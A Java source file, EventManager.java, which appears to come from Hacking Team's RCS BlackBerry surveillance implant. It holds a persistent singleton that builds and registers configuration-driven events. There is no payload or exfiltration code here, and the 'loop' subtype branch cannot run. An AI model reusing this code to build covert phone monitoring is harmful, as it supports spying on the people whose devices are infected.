//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : EventManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.manager;

import net.rim.device.api.system.RuntimeStore;
import blackberry.JobManager;
import blackberry.config.ConfEvent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.event.FactoryEvent;
import blackberry.interfaces.Singleton;

/**
 * The Class EventManager.
 */
public final class EventManager extends JobManager implements Singleton {

    private static final long GUID = 0x3c80b0de21f15f46L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);
    //#endif

    /** The instance. */
    private static EventManager instance = null;

    /**
     * Gets the single instance of EventManager.
     * 
     * @return single instance of EventManager
     */
    public static synchronized EventManager getInstance() {
        if (instance == null) {
            instance = (EventManager) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final EventManager singleton = new EventManager();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }

        }

        return instance;
    }

    /**
     * mapAgent() Add agent id defined by "key" into the running map. If the
     * agent is already present, the old object is returned.
     * 
     * @param key
     *            : Agent ID
     * @return the requested agent or null in case of error
     */
    public Event makeEvent(final ConfEvent conf) {

        Event event = null;

        String type = conf.getType();
        String subtype = conf.getSafeString("subtype");
        if (subtype == null)
            subtype = "";

        String ts = conf.getSafeString("ts");
        String te = conf.getSafeString("te");

        // TODO
        if (subtype == null && "00:00:00".equals(ts) && "23:59:59".equals(te)) {
            subtype = "loop";
        }

        event = FactoryEvent.create(type, subtype);
        if (event != null) {
            if(event.setConf(conf)){
                add(event);
            }else{
                //#ifdef DEBUG
                debug.error("makeModule: wrong conf or not supported, don't add");
                //#endif
            }
        }
        return event;
    }
}
